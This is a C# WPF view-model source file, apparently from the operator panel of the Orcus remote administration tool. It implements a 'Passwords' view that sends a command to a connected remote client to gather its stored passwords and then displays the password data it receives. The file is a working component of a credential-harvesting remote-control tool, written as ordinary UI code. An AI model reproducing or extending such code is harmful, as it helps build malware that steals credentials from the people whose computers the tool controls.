using System;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.Passwords;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.Password;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class PasswordsViewModel : CommandView
    {
        private IClientController _clientController;
        private RelayCommand _gatherPasswordsCommand;
        private bool _isLoading;
        private PasswordData _passwordData;

        public override string Name { get; } = (string) Application.Current.Resources["Passwords"];
        public override Category Category { get; } = Category.Information;
        public PasswordsCommand PasswordsCommand { get; private set; }

        public PasswordData PasswordData
        {
            get { return _passwordData; }
            set { SetProperty(value, ref _passwordData); }
        }

        public bool IsLoading
        {
            get { return _isLoading; }
            set { SetProperty(value, ref _isLoading); }
        }

        public RelayCommand GatherPasswordsCommand
        {
            get
            {
                return _gatherPasswordsCommand ??
                       (_gatherPasswordsCommand = new RelayCommand(parameter =>
                       {
                           PasswordsCommand.GetPasswords();
                           IsLoading = true;
                       }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            PasswordsCommand = clientController.Commander.GetCommand<PasswordsCommand>();
            PasswordsCommand.PasswordsReceived += PasswordsCommand_PasswordsReceived;
            _clientController = clientController;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/PasswordRecovery_16x.png", UriKind.Absolute));
        }

        private void PasswordsCommand_PasswordsReceived(object sender, PasswordData e)
        {
            PasswordData = e;
            IsLoading = false;
        }

        public override async void LoadView(bool loadData)
        {
            if (_clientController.Client.IsPasswordDataAvailable)
            {
                IsLoading = true;
                PasswordData = await
                    Task.Run(
                        () => _clientController.ClientCommands.GetPasswords(ClientController.Client));
                IsLoading = false;
            }
        }
    }
}